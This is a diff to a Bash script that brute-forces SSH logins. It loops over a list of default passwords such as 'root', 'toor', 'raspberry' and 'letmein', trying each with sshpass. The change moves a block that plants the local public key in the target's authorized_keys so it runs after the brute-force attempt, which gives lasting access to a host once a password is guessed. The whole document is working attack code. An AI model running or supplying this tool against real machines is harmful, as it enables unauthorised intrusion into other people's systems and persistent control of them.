@@ -11,7 +11,7 @@ root toor raspiraspi raspberry test uploader password admin administrator market
 letmein logon Passw@rd
 )
 
-while getopts h:u:p:kb opt #to make getopts expect an argument for an option,
+while getopts h:u:p:kgb opt #to make getopts expect an argument for an option,
 do                         #place ':' after the proper option flag.
 	case $opt in
 		h)host=$OPTARG;;
@@ -35,21 +35,7 @@ then
 		port="22" #default port
 	fi
 
-	echo -e "$ ssh $user@$host -p $port\n"
-
-	if [[ $publickey ]]
-	then
-		if [[ $genNewKey ]]
-		then
-			echo 'generating a public and private key pair..'
-			echo -e '$ ssh-keygen -t rsa\n'
-			ssh-keygen -t rsa
-		fi
-
-		echo 'configuring ssh authentication with public key for user $user..'
-		echo -e '$ cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"\n'
-		cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
-	fi
+	echo -e " USER=$user\n HOST=$host\n PORT=$port\n"
 
 	if [[ $bruteforce ]]
 	then
@@ -65,6 +51,20 @@ then
 			sshpass -p $passwd ssh -p $port $user@$host
 			#TODO: stop if it logs in
 		done
+	fi
+
+	if [[ $publickey ]]
+	then
+		if [[ $genNewKey ]]
+		then
+			echo 'generating a public and private key pair..'
+			echo -e '$ ssh-keygen -t rsa\n'
+			ssh-keygen -t rsa
+		fi
+
+		echo 'configuring ssh authentication with public key for user $user..'
+		echo -e '$ cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"\n'
+		cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
 	fi
 
 else
